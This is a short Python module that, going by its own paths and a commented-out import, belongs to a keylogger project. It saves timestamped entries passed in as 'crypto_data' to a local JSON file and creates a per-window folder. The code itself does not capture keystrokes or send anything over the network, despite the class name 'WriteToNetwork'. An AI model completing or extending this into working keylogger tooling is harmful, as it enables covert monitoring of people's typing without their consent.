import json
import os
from datetime import datetime
# from keyloggerAgent.manager_keyLogger import manager
FILE_PATH = "data.json"
base_directory = r"C:\devlopment\python\keyloggerProject\keyloggerBackend\data"




class WriteToNetwork:

    def __init__(self):
        self.name_window="default_window"
        directory = os.path.join(base_directory,self.name_window)
        if not os.path.exists(directory):
            os.makedirs(directory)

        if not os.path.exists(FILE_PATH):
            with open(FILE_PATH, "w") as file:
                json.dump({}, file)
    def get_name_window(self,name):
        self.name_window=name

    def load_data(self):

        if os.path.exists(FILE_PATH):
            with open(FILE_PATH, "r") as file:
                return json.load(file)

        return {}

    def save_data(self, data):

        with open(FILE_PATH, "w") as file:
            json.dump(data, file, indent=4)

    def add_entry(self, new_info):

        data = self.load_data()
        print(data)
        current_time = datetime.now().strftime("%Y-%m-%d %H:%M")

        if current_time in data:
            data[current_time].append(new_info)
        else:
            data[current_time] = [new_info]

        self.save_data(data)

    def write(self, crypto_data):

        self.add_entry(crypto_data)



